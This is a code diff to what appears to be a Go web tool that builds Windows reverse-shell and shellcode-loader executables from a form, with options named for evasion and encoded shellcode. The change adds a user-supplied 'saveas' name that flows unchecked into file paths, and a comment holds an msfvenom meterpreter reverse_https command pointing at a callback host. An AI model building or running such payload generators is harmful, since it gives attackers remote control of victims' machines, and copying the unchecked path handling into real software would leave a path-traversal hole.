@@ -221,7 +221,7 @@ func createencodepsvallocgofile() {
 
 }
 
-func createencodedpsvirtualallocpayload(shellcode string) {
+func createencodedpsvirtualallocpayload(shellcode, saveas string) {
 	file, err := os.Open("basefiles/vallocencode.ps1")
 	if err != nil {
 		log.Fatal(err)
@@ -246,10 +246,10 @@ func createencodedpsvirtualallocpayload(shellcode string) {
 		log.Fatal(err)
 	}
 	createencodepsvallocgofile()
-	buildexe("download/encpsalloc.exe", "outfiles/psencodevalloc.go")
+	buildexe("download/"+saveas+".exe", "outfiles/psencodevalloc.go")
 }
 
-func createpsvirtualallocpayload(rhost string, rport string, shellcode string) {
+func createpsvirtualallocpayload(rhost, rport, shellcode, saveas string) {
 	file, err := os.Open("basefiles/virtualalloc.ps1")
 	if err != nil {
 		log.Fatal(err)
@@ -275,7 +275,7 @@ func createpsvirtualallocpayload(rhost string, rport string, shellcode string) {
 		log.Fatal(err)
 	}
 	createpsvallocgofile()
-	buildexe("download/psalloc.exe", "outfiles/psvalloc.go")
+	buildexe("download/"+saveas+".exe", "outfiles/psvalloc.go")
 }
 
 // creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
@@ -334,7 +334,7 @@ func creategorevhttppayload(ipandport string) {
 	}
 	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
 }
-func createpsrevshellpayload(rhost string, rport string) {
+func createpsrevshellpayload(rhost, rport, saveas string) {
 	file, err := os.Open("basefiles/rev.ps1")
 	if err != nil {
 		log.Fatal(err)
@@ -362,7 +362,7 @@ func createpsrevshellpayload(rhost string, rport string) {
 		log.Fatal(err)
 	}
 	createpsrevgofile()
-	buildexe("download/rev.exe", "outfiles/rev.go")
+	buildexe("download/"+saveas+".exe", "outfiles/rev.go")
 	//buildrevshellexeforpscript()
 	//finflag <- "finished pscriptexe"
 }
@@ -375,6 +375,7 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 		}
 	} else {
 		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -387,17 +388,17 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 		//fmt.Println("rport =" + rport)
 		//finflag := make(chan string)
 		if evadeoption == "psRevShell" {
-			createpsrevshellpayload(rhost, rport)
+			createpsrevshellpayload(rhost, rport, saveas)
 			//<-finflag
 			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/rev.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/rev.go")
 			//fmt.Println(dwnloadlink.Link)
 		} else if evadeoption == "psValloc" {
 			shellcode := req.Form.Get("shellcode")
-			createpsvirtualallocpayload(rhost, rport, shellcode)
+			createpsvirtualallocpayload(rhost, rport, shellcode, saveas)
 			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/psalloc.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/psvalloc.go")
 			//fmt.Println("shellcode =" + shellcode)
 
@@ -408,9 +409,9 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			compressed := shellexeccompress(strtocompress)
 			//fmt.Println(compressed)
 			encstring := b64.StdEncoding.EncodeToString(compressed)
-			createencodedpsvirtualallocpayload(encstring)
+			createencodedpsvirtualallocpayload(encstring, saveas)
 			time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/encpsalloc.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			//os.Remove("outfiles/psencodevalloc.go")
 			//fmt.Println(dwnloadlink.Link)
 
@@ -418,31 +419,27 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			//creategorevhttppayload(rhost + ":" + rport)
 			basepath = filepath.FromSlash("basefiles/gorevhttp.go")
 			outpath = filepath.FromSlash("outfiles/gorevhttp.go")
-			exepath = filepath.FromSlash("download/gorevhttp.exe")
+			exepath = filepath.FromSlash("download/" + saveas + ".exe")
 			exeoutpath = filepath.FromSlash("outfiles/gorevhttp.go")
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
-			//creategopayload(rhost+":"+rport, "basefiles/gorevhttp.go", "outfiles/gorevhttp.go", "download/gorevhttp.exe", "outfiles/gorevhttp.go")
-			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/gorevhttp.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/gorevhttp.go")
 		} else if evadeoption == "goRevShel" {
 			basepath = filepath.FromSlash("basefiles/gorevcmd.go")
 			outpath = filepath.FromSlash("outfiles/gorevcmd.go")
-			exepath = filepath.FromSlash("download/gorevcmd.exe")
+			exepath = filepath.FromSlash("download/" + saveas + ".exe")
 			exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
 			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/gorevcmd.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/gorevcmd.go")
 		} else if evadeoption == "gorevhttpsheap" {
 			basepath = filepath.FromSlash("basefiles/gorevhttps.go")
 			outpath = filepath.FromSlash("outfiles/gorevhttps.go")
-			exepath = filepath.FromSlash("download/gorevhttps.exe")
+			exepath = filepath.FromSlash("download/" + saveas + ".exe")
 			exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
-			//creategopayload(rhost+":"+rport, "basefiles/gorevhttps.go", "outfiles/gorevhttps.go", "download/gorevhttps.exe", "outfiles/gorevhttps.go")
-			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/gorevhttps.exe"
+			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/gorevhttps.go")
 		}
 		//msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=443 -f psh
